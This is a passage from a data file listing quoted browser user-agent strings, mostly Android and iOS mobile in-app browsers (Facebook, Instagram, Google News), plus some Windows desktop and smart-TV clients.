"Mozilla/5.0 (Linux; Android 13; Nokia G42 5G Build/TKQ1.221223.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBID/phone;FBLC/nl_Qaau_NL;FBOP/5]",
"Mozilla/5.0 (Linux; Android 12; M2007J3SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (Linux; Android 11; M2007J17G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; YAL-L21 Build/HUAWEIYAL-L61; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-T585 Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/279.1.560156937 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SNS32.34-72-31-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (31/12; 446dpi; 1080x2161; motorola; moto g32; devon; qcom; pt_BR; 510206698)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Viewer/91.9.1478.79",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 Instagram 298.0.0.19.114 (iPhone9,4; iOS 15_7_8; pt_BR; pt; scale=3.00; 1242x2208; 509296496) NW/3",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1M Build/HUAWEIMAR-L21MEA; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; M2007J17G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 12; M2004J19C Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; Armor X10 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; NX659J Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; M2006C3MG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 2210129SG Build/SKQ1.220303.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 11; motorola razr Build/RPVS31.Q2-62-7-11-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; LM-X430 Build/QKQ1.200730.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SNS32.34-72-31-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Replaio/3.1.9",
"Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5705.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5885.156 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; ru-ru; Redmi Note 5 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.4.3-g",
"Mozilla/5.0 (Linux; arm_64; Android 12; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5805.54 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5705.52 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto e22 Build/SOVS32.121-40-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Motorola Defy Build/RZD31.31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; M10 4G PRO X Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 420dpi; 1080x2195; samsung; SM-A315G; a31; mt6768; pt_BR; 510206698)",
"Mozilla/5.0 (Linux; Android 9; SM-A705FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 2201117TY Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.25.113;]",
"Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 OPR/46.0.2207.0 OMI/4.11.3.57.Martell-3.133 Model/Hisense-MT5659-SDK4-11 (;Hisense;SmartTV;V1100.01.00A.M0112;40A35EEVS) FXM-U2FsdGVkX1/iMqP/z51Oej14Br88++YaRMSqyi37WCmD1H/eAqaJWk2NEPwMYjAp-END",
"Mozilla/5.0 (Linux; Android 13; CPH2339 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Config/96.2.9281.82",
"Mozilla/5.0 (Linux; Android 13; CPH2247 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 11; M2010J19CG Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 9; AFTKA Build/PS7646.3565N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.170 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",
"Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 12; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.0.4095.74331",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-S757BL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.34 Safari/537.36 HbbTV/1.4.1 (+DRM; LGE; 32LM6380PLC; WEBOS4.5 05.30.40; W45_M3R; DTV_W19R;) LaTivu_1.0.1_2019",
"Mozilla/5.0 (Linux; Android 11; CPH2219 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; M2101K7BNY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.29.71;]",
"Mozilla/5.0 (Linux; Android 11; SM-A035G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-G780F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 Klarna/23.22.213",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1B; HMSCore 6.11.0.332; GMSCore 23.31.16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.322 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; RMX3630 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.57 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (Linux; Android 13; RMX3241 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; N20 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; moto g(7) power Build/QPOS30.52-29-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 320dpi; 720x1371; motorola; moto g(7) power; ocean_t; qcom; pt_BR; 510206687)",
"Mozilla/5.0 (Linux; Android 11; CPH2021 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 2109119DG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (30/11; 440dpi; 1080x2166; Xiaomi; 2109119DG; lisa; qcom; it_IT; 510206032)",
"Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.44",
"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5326a [FBAN/FBIOS;FBDV/iPad14,5;FBMD/iPad;FBSN/iPadOS;FBSV/17.0;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5]",
"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 480dpi; 1080x2176; samsung; SM-G991B; o1s; exynos2100; en_GB; 510206698)",
"Mozilla/5.0 (Linux; Android 13; 22041219NY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]",
"Mozilla/5.0 (Linux; Android 10; SM-A013M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 Instagram 293.1.0.21.50 (iPhone15,3; iOS 16_3; fr_RU; fr; scale=3.00; 1290x2796; 498085230)",
"Mozilla/5.0 (Linux; Android 12; SM-G977B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 13; PGZ110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.5.95.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5830.15 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5710.38 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaApp_Android/23.70.1 YaSearchBrowser/23.70.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12.0.0; Pixel 3a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.46",
"Mozilla/5.0 (Linux; arm_64; Android 11; Infinix X663D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.3.104.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Doro 8040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; T790Y Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022091350",
"Mozilla/5.0 (Linux; Android 12; M2004J19C Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Config/97.2.2371.72",
"Mozilla/5.0 (Linux; Android 13; CPH2273 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022086958",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 Instagram 298.0.0.19.114 (iPhone12,1; iOS 16_6; en_SE; en; scale=2.00; 828x1792; 509296496)",
"Mozilla/5.0 (Linux; U; Android 13; pt-br; Xiaomi 11 Lite 5G NE Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.35.0-gn",
"Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/nl_NL;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 GNews Android/2022089220",
"Mozilla/5.0 (Linux; Android 10; moto e(7) Build/QOFS30.569-83-18) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-G996B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 450dpi; 1080x2190; samsung; SM-G996B; t2s; exynos2100; nl_BE; 510206667)",
"Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2128.0 OMI/4.8.0.129.Driver3.34, HbbTV/1.1.1 _TV_MT5806/201.003.248.001 (Philips, PUS7805, wired) CE-HTML/1.0 NETTV/4.6.0.2 SignOn/2.0 SmartTvA/5.0.0 WH1.0 en",
"Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]",
"Mozilla/5.0 (Linux; Android 13; NTH-NX9 Build/HONORNTH-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 GLS/96.10.1059.60",
"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/424.0.0.27.114;FBBV/510306677;FBDV/iPad7,6;FBMD/iPad;FBSN/iPadOS;FBSV/16.6;FBSS/2;FBCR/;FBID/tablet;FBLC/it;FBOP/0]",
"Mozilla/5.0 (Linux; Android 11; 22011119UY Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Linux; Android 10; POCOPHONE F1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 220333QNY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36 Atom/1.4.1.54",
"Mozilla/5.0 (Linux; Android 12.0.0; Pixel 3 XL) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.43",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2658.14 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 13; 2203129G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.5.95.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OpenWave/96.4.1853.54",
"Mozilla/5.0 (Linux; Android 13; SM-A136B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; MI 8 Lite Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 6.0; LG-X230 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 10; SM-A750G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; STK-LX1 Build/HONORSTK-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A135F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022146282",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 GLS/94.10.7389.90",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.14.10.19041; 10.0.0.0.19044.3324) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19044",
"Mozilla/5.0 (Linux; Android 12; 220333QAG Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto g62 5G Build/S1SSS32.53-85-4-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; PEEM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GNews Android/2022086952",
"Mozilla/5.0 (Linux; Android 13; CPH2333 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]",
"Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Agency/99.8.3217.18",
"Mozilla/5.0 (Linux; Android 11; M2006C3LG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 13; LM-G900 Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 Instagram 298.0.0.19.114 (iPhone14,5; iOS 16_6; fr_FR; fr; scale=3.00; 1170x2532; 509296496)",
